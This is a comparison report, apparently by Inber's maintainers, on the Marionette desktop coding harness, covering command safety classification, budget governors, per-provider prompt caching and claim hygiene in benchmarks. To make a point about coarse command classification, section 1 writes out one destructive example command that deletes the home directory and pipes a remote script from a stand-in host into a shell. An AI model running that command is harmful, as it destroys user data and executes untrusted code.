# Marionette Comparison

**Project**: [Marionette](https://github.com/professorpalmer/marionette) (formerly `pm-harness`)
**Language**: Python (stdlib backend) + React/Electron frontend
**Focus**: A desktop coding harness that treats the LLM as a component inside a durable-state kernel, not as the platform that owns the conversation
**Key Strengths**: Command-level safety classification, a budget governor written before the autonomy it guards, per-provider prompt-cache knowledge held as data, preflight before indexing, distilled briefs instead of transcripts on delegation

**Studied**: 2026-08-16. All facts below read from the repository at HEAD `39437d5`, the GitHub API, PyPI, and the two external evidence repos. Nothing was executed; every runtime claim is the author's, not a measurement of ours.

## What It Is

Marionette is one person's desktop coding harness — 1,218 commits since 2026-06-24, 99.3% of them from Cary Palmer, 282 releases, 16 stars. It is the pilot shell on top of **Puppetmaster** (`puppetmaster-ai` on PyPI, 316 stars, MIT), the same author's job supervisor: a swarm orchestrator that starts independent workers, routes tasks to a model, and stores typed results in SQLite so jobs can be inspected and resumed.

The split matters more than either half. Marionette calls Puppetmaster **in-process**, bypassing its MCP tools and CLI:

```python
from puppetmaster.store_factory import create_store
from puppetmaster.orchestrator import Orchestrator
store  = create_store("sqlite", state_dir)
result = Orchestrator(store).run(goal, roles=..., worker_mode=..., on_job_created=...)
```

`harness/state.py` is a **read-only** view over Puppetmaster's store. Marionette never writes job state; it reads events through `read_events_since` / `event_cursor` / `wait_for_events`. One owner per plane, enforced by an explicit table in `ARCHITECTURE.md` §7c that forbids a second cache stamper, history compressor, spill engine, or worker store.

The stated thesis is an incentive argument: *"A first-party coding tool from a model lab sells you tokens — every optimization that cuts your token bill cuts their revenue."* Hence CodeGraph-targeted retrieval, multi-provider caching, routing to the cheapest sufficient model, and cache-read discounts billed at the real multiplier.

## Architecture Overview

```
Electron renderer (React, three panes)
        |  window.harnessIPC  (getJSON / postJSON / SSE / upload)
        v
stdlib Python backend  (harness/server.py)  --  SSE event stream
        |
   ConversationalSession  (harness/conversation.py)  -- the pilot loop
        |                         |                          |
  structured tools          CodeGraph context         Puppetmaster
  (read/search/edit/run)    (per-turn, self-heal)     Orchestrator(store).run(...)
                                                              |
                                                       durable SwarmStore
```

Size, measured on a clone: `harness/` 88,768 lines over 211 files; `tests/` 102,838 lines with **4,204 test functions**; `webapp/src` 67,704 lines of TypeScript. `conversation.py` is 3,811 lines, `server.py` 3,228. The pilot loop is a facade over nine mixins (`SendLoopMixin`, `ToolDispatchMixin`, `CompactionContextMixin`, and so on). The HTTP server is `ThreadingHTTPServer` from the standard library — no FastAPI, no uvicorn — with route bodies in 42 modules under `harness/api/`.

The turn contract is a `PilotTurn`: `{"say": "<prose>", "actions": [{"kind": "read_file"|"run_command"|"run_swarm"|...}]}`. An empty `actions` list ends the turn. Provider-native pilots emit the same actions as native `tool_calls`; the JSON envelope is only the fallback parser.

## What Marionette Does Well

### 1. Safety policy classifies commands, not tools ⭐️

`harness/command_policy.py` is 655 lines of two pure functions with no Puppetmaster import: `resolve_timeout()` and `classify_command()`. Its docstring states the design rule plainly:

> "The classifier is intentionally conservative: it flags by PATTERN, accepts that it will sometimes flag a benign command… and never tries to 'sanitize' or rewrite a command — it only labels it."

Two decisions carry the weight. First, it **labels and never rewrites** — a sanitizer that edits a command has to be right about shell semantics, and being wrong means running something the user never typed. Second, the guard **only bites in full-auto**; interactive co-working is untouched, so the classifier can afford false positives.

**Inber connection**: `guard/guard.go` classifies at *tool-name* granularity. `isDangerous` is a switch over `"shell_commands", "write_files", "edit_files", "deploy"` — so the entire shell is one bit. In Assist mode, `echo hi` and `rm -rf ~ && curl evil.sh | sh` produce the identical verdict, and an approver is asked the same question for both. Inber's own code comment already records what that granularity cost once: `isDangerous` silently stopped matching writes when tool-store renamed `write_file` → `write_files`, so Assist waved writes through unapproved until `TestClassifiedToolsExist` pinned the names.

### 2. The governor was built before the autonomy ⭐️

`harness/autobudget.py`, 197 lines, states its own build order:

> "the governor is built and tested BEFORE the autonomy it guards — the brakes go in before the engine"

and its trust model:

> "The governor never trusts the model to stop itself; it is enforced by the loop around the model."

Defaults: `max_tokens=500_000`, `max_seconds=3600`, `max_swarms=20`, `max_idle_steps=3`, plus a `killswitch_path` stop-file. Sub-agent trees link back to the parent, so nesting does not reset the ceiling.

**Inber connection**: `guard` has four of these — `MaxTurns`, `MaxInputTokens`, `MaxCost`, `MaxDuration`. It lacks the two that catch a *stuck* run rather than an expensive one. `max_idle_steps` is precisely the no-progress detector inber wrote and never wired: `Guard.RecordToolCall` feeds `repeatCount`, and inber's own doc comment admits nothing calls it, so `IsRepeating` has never once answered true. That comment also names the real blocker — *"what a caller should then DO when IsRepeating goes true is the part nobody has decided"*. AutoBudget answers it: stop the run. And the killswitch stop-file is the out-of-band abort inber has no equivalent of, since a wedged engine cannot be talked out of a loop through the same channel that wedged it.

Inber's spawn depth is bounded in the server (`MaxSpawnDepth`), not in guard, so a spawned child today gets a fresh set of limits. Marionette links the child's ceiling to the parent's.

### 3. Per-provider cache knowledge, held as data ⭐️

`pmharness/drivers/prompt_cache.py` is the **sole owner** of cache stamping, and it knows the thing that is easy to get wrong:

> "OpenRouter requires EXPLICIT cache_control for Anthropic Claude and Alibaba Qwen. OpenAI / Gemini / DeepSeek / Grok / Moonshot are automatic — do not invent markers for those."

Empty or whitespace envelopes never burn one of Anthropic's four breakpoints. `history_cache_carriers` walks markers back to messages that can actually carry them. For Codex it uses `prompt_cache_key` plus a stable sentinel `CODEX_CACHE_BOUNDARY_TEXT = "marionette_stable_prefix_v1"`, and **strips it and retries on a 400** rather than assuming the provider accepts it.

**Inber connection**: this is the corrective to inber's own `__CACHE_BOUNDARY__` history. That sentinel was deleted 2026-08-07 by `e8f378d` as dead code — it never worked, because the only path building those blocks rewrote every memory ID first, so no block ever carried the marker and both readers were unreachable. `docs/cache-optimization.md` carries the post-mortem. The lesson Marionette encodes is that a cache marker is **provider-specific data, not a universal mechanism**, and that a marker needs a failure path (strip and retry) because the provider is entitled to reject it.

Inber is already even on the billing half: `engine/turn_postprocess.go` prices `CacheReadTokens` and `CacheCreationTokens` per call against model-store. Marionette uses a flat `CACHE_READ_MULTIPLIER = 0.1` owned by `harness/api/cost.py` and surfaces it as `cache_savings_usd` — inber's model-store lookup is the better source of truth, since the multiplier is a per-model fact.

### 4. Preflight before indexing

`harness/codegraph_preflight.py` (458 lines) walks a capped tree, scores what is genuinely indexable, and **recommends excludes or a narrower root before** `codegraph init --index` runs. The motivating case is a game-client repo where the asset tree dwarfs the source.

This is the unglamorous half of retrieval and the half that decides whether an index is usable. `.codegraph/config.json` covers 35 file globs across roughly 30 languages against about 90 exclude globs — the excludes outnumber the includes nearly three to one.

**Inber connection**: `codeindex/codeindex.go` is 88 lines. Its doc comment promises tree-sitter parsing, embedding search, token-budgeted signatures, and graph relevance ranking. `Open` returns `&Index{repoRoot: repoRoot}` and `Refresh` returns `nil`; every body is `// TODO: implement`. Inber has the *shape* of Aider's repo-map and none of the substance. If that ever gets built, preflight is the part that will not be obvious from the doc comment.

### 5. Workers get a distilled brief, never the transcript

From `conversation.py`: *"Swarm workers receive only the distilled `goal` brief (+ CodeGraph). The transcript never enters a worker."*

Delegation verbs are separated by capability: `run_swarm` (read-only analysis), `run_implement` (edit-capable, in a worktree), `run_parallel` (concurrent waves), `route_task`. Read-only analysis cannot accidentally acquire write authority.

**Inber connection**: `docs/async-spawning.md` describes fire-and-forget `spawn_agent` with results written to disk and `check_spawns` for status — good on the concurrency axis. The context-hygiene rule is the addition: a child that inherits transcript inherits claims it cannot verify. This is the same failure `docs/fork-inheritance-audit.md` hunts, arrived at from the delegation side rather than the fork side.

### 6. Reattachable SSE with named failure modes

`GET /api/chat/events?since=<cursor>` replays from a bounded per-generation ring. When replay is impossible the server says *which* impossibility it hit — `ring_miss`, `generation_mismatch`, `cursor_gap` — and the client hydrates instead of silently resuming from a hole. Auth is a per-process token (`HARNESS_TOKEN` or `secrets.token_hex(16)`, written chmod-600) enforced by one centralized gate in `do_GET` with a four-path public allowlist, plus Host and Origin validation.

The named-failure design is the transferable part: a gap in an event stream that reports itself as a gap is recoverable; one that resumes quietly is a bug that surfaces as a confused model three turns later.

## What Inber Should Adopt

### 1. Command-level classification for `shell_commands` (HIGH PRIORITY)

Split the single `isDangerous("shell_commands")` bit into a classifier over the actual command string. Adopt Marionette's two rules verbatim: **label, never rewrite**, and **flag conservatively**, accepting false positives because the guard only bites where nobody is watching.

Inber does not need to write the parser. **permission-store** (`:8304`) already has the AST-based Bash command splitter done — its README calls that step 1 of 7, and the splitter is the finished step. Wiring `guard.CheckTool` to send the command text to permission-store, and keeping the tool-name switch only as the fallback for tools with no command string, turns two half-built things into one working one.

First step: change `CheckTool(tool, input string)` so the `input` it already receives is actually consulted for `shell_commands` instead of being passed through to `ApprovalFunc` unexamined.

### 2. A no-progress ceiling and an out-of-band killswitch (HIGH PRIORITY)

Add `MaxIdleSteps` and `KillswitchPath` to `guard.Config`.

`MaxIdleSteps` finally gives `RecordToolCall` a reader. Wire it in the `OnToolResult` hook — inber's own comment says that is one line — and make `CheckLimits` return exceeded when `IsRepeating()` goes true. The decision nobody had made is now made: a run repeating the same call with the same input is not working, and it stops.

`KillswitchPath` is a file the guard stats between turns. It is the only abort channel that works when the engine is wedged, because it does not go through the engine.

Also make a spawned child's budget a **share of the parent's remaining** rather than a fresh allocation, matching Marionette's parent-linked trees. Today `MaxSpawnDepth` bounds how deep the tree goes and nothing bounds what it costs.

### 3. A per-provider cache-control table (MEDIUM PRIORITY)

Replace the deleted universal sentinel with data: for each provider, does it need an explicit marker, how many breakpoints does it allow, and what does it do when handed one it does not want. Marionette's split — explicit for Anthropic and Qwen through OpenRouter, automatic for OpenAI, Gemini, DeepSeek, Grok, Moonshot — is a table, and a table is testable in a way a sentinel scattered through prompt assembly was not.

Add the strip-and-retry-on-400 path. Inber's failure mode was a marker that silently did nothing; the opposite failure — a marker a provider rejects outright — needs a recovery that is not "the turn dies".

Keep model-store as the cost source. Do not copy the flat `0.1` multiplier.

### 4. Distilled brief on delegation (MEDIUM PRIORITY)

Make `spawn_agent` pass a goal brief plus retrieved context, never the parent transcript, and split the spawn verbs by capability so a read-only analysis spawn cannot write. This is `docs/fork-inheritance-audit.md`'s finding applied to a second path.

### 5. Named gaps in the event stream (LOW PRIORITY)

When inber's server cannot replay from a cursor, say which impossibility it hit rather than resuming from wherever it can. Three named cases beat one silent one.

## Evidence Hygiene — read this before quoting any number

Marionette's README leads with two figures. Both are real studies. **Neither one's evidence is in this repository**, and the README states both more strongly than its own sources do.

**SWE-bench Lite, "about 47 percent cheaper than the frontier baseline at equal quality."** The evidence is `professorpalmer/swebench-pm` — a genuine three-arm design (A: frontier baseline; B: A plus CodeGraph injection and a task-aware router; C: B plus durable retries), temperature fixed, with **frozen predictions** re-gradeable under Docker without API keys. That is better practice than most harness benchmarking. But the same author's **Puppetmaster** README describes the same study as *"29% lower actual spend… 47–48% **token-matched** savings. This is a single-seed study and **does not establish quality parity**."* Marionette's README compresses that into "47 percent cheaper at equal quality". Same author, two repos, incompatible framings. Use the Puppetmaster wording.

**NL2Repo-Bench, "91.1 percent mean test-pass rate, about 2.28x the ~40 percent published state of the art."** The evidence is published properly — `professorpalmer/durable-state-vs-context`, MIT code, CC BY 4.0 paper, DOI 10.5281/zenodo.20709565. The quoted sentence is accurate to §4.9. The paper's *own* caveats are the ones the README drops: workers ran on a commercial coding agent rather than a named model, so the authors read the result as *"durable-state orchestration substantially exceeding the published field, not as a head-to-head model comparison"*; four tasks fail for packaging reasons and stay in the denominator; and NL2RepoBench is §4.9 external validation, not the paper's subject — the primary study is a jsdom JS→TS migration with a `tsc --strict` oracle.

**The in-repo benchmark is the one to imitate.** `bench/cache_wars.py` ran live OpenRouter arms, 40 messages each, and reported `marionette_1h` at $2.9772 against `no_cache` at $8.7909 — 66.1% cheaper on that run. It measured its own overhead at 28 tool definitions and roughly 3,726 tokens. Then it added a section headed **"Claim hygiene"**: *"Not safe from this alone: 'cheapest harness always' / 'beats AGNT'."* It also logged that two arms hit 11 errors each.

`FINDINGS.md` does the same thing for model evaluation. Stage 3 found claude-opus scoring **worst** on multi-turn at 55% by never terminating; Stage 3.5 showed that was a harness confound and the same model went 55% → 100% once given a real findings digest and an explicit budget. An early "30%" run turned out to be a masker-truncated API key, was caught, and was never reported. `STAGE2_RESULTS.md` labels its own battery saturated: *"8/10 models at exactly 100% — it proves the floor… but does NOT rank."*

**The transferable practice**: a measurement ships with a written statement of what it does *not* establish, in the same file. Inber's docs already correct themselves well after the fact — `cache-optimization.md` and `bub.md` both carry dated corrections. Naming the non-claim at write time is the cheaper version of the same discipline.

## What's Different

| Aspect | Marionette | Inber |
|--------|-----------|-------|
| **Language** | Python (stdlib) + React/Electron | Go |
| **Surface** | Desktop app, three panes | CLI + HTTP server + bus |
| **Orchestration** | Separate kernel (Puppetmaster), called in-process | In-engine `spawn_agent` |
| **State ownership** | Kernel owns job state; harness reads only | Engine owns everything |
| **Safety granularity** | Per-command pattern classification | Per-tool-name switch |
| **Budget governor** | Tokens, seconds, swarms, idle steps, killswitch file | Turns, input tokens, cost, duration |
| **No-progress detection** | `max_idle_steps=3`, enforced | Written, never wired — `RecordToolCall` has no caller |
| **Code retrieval** | CodeGraph (third-party) + 458-line preflight | `codeindex` — 88 lines, every body `// TODO` |
| **Cross-session memory** | LLM Wiki, distilled by the *cheap* pilot, human-approved | `memory` — 37-line re-export of memory-store |
| **Cache control** | Per-provider table, sole owner, strip-and-retry | Universal sentinel, deleted 2026-08-07 as dead |
| **Cache cost source** | Flat `0.1` multiplier | model-store per-model lookup |
| **Delegation context** | Distilled goal brief; transcript never enters a worker | Task text; fork inheritance audited separately |
| **Providers** | 14, seven API modes, hot-swap by task | Anthropic SDK plus a provider interface |
| **Default driver** | `qwen3-coder-30b` via OpenRouter | Claude models via model-store |
| **Tests** | 4,204 test functions, 102,838 lines | Per-package, coverage audited |
| **Authorship** | 99.3% one person, 7.5 weeks, 282 releases | Personal infrastructure, multi-agent maintained |
| **License** | **None — no LICENSE file anywhere** | — |

## Risks and Caveats

**There is no license.** Confirmed three ways: the GitHub API `license` field is null, there is no LICENSE or COPYING file in the 1,029-blob tree, and no license text elsewhere. The repository is all-rights-reserved by default. **Do not copy code from it.** Ideas and architecture are fair to learn from; source is not. Puppetmaster itself is MIT, and the two evidence repos differ — `durable-state-vs-context` is MIT, `swebench-pm` has no license either.

**"One real dependency" is true of the Python backend and not of the shipped app.** `pyproject.toml` declares `pypdf` and does *not* declare puppetmaster at all; the pin lives in `scripts/install.sh` as `puppetmaster-ai==1.22.5`. `uv.lock` contains no puppetmaster-ai and still pins `pm-harness` at 0.9.215 against a shipped 0.9.232. The Electron side carries roughly 15 npm runtime dependencies plus a native `better-sqlite3` build needing a C toolchain. CodeGraph is a third party (`colbymchenry/codegraph`) reached through Puppetmaster, not vendored.

**The docs contradict each other on the schedule surface.** `ARCHITECTURE.md` §9c says there is no HTTP, UI, or SSE surface for schedules — CLI daemon only. The README says HTTP plus a Settings UI can list, mutate, run-now, and read history. `harness/api/schedules.py` exists, so §9c looks stale, but neither was executed. Treat any single doc statement here as a claim.

**Bus factor and maturity.** 1,210 of 1,218 commits from one person over 7.5 weeks. 16 stars, 3 forks, 0 subscribers, 2 open issues, and the only non-owner contributions arrived in the two days before this study. The project calls itself *"v0.9.232, deliberately pre-1.0."* No third-party adoption found.

**Scale of the files.** `conversation.py` is 3,811 lines and `server.py` 3,228, held together by nine mixins. The 4,204 test functions are a real counterweight, but this is not a codebase whose module boundaries are worth copying — inber's backlog runs the other direction.

## Key Takeaway

Marionette's structural bet is that **orchestration should not be a tool the model calls**. Every mainstream harness puts a frontier narrator in charge of both the conversation and the delegation; Marionette puts a durable job store underneath and demotes the model to a component that fills in one plane. Inber made a version of the same bet — engine, memory-store, agent-store, forge as separate owners — but the engine still owns more planes than Marionette's pilot does.

The immediately actionable findings are smaller and sharper than that thesis, and three of them are the *same* finding from different angles: **inber has written the shape of a thing and not the thing.** `codeindex` is 88 lines of TODO under a doc comment describing tree-sitter and embedding search. `RecordToolCall` feeds a repetition counter no caller increments. `__CACHE_BOUNDARY__` was a sentinel no block ever carried. In each case Marionette has the working version, and in each case what it adds is not cleverness but the boring half — the preflight before the index, the decision about what happens when the counter trips, the per-provider table saying who accepts a marker at all.

Start with the command classifier, because inber's is one bit for the whole shell and permission-store has already built the splitter that fixes it. Then give `IsRepeating` a reader, since that costs one line in a hook and closes a gap inber's own comments have been apologising for.

And take the claim-hygiene habit for free: `bench/cache_wars.py` states what its own 66.1% figure does not prove, in the file that reports it. The two headline numbers, whose evidence lives in other repositories, do not — and reading them next to their own sources is the whole argument for the habit.
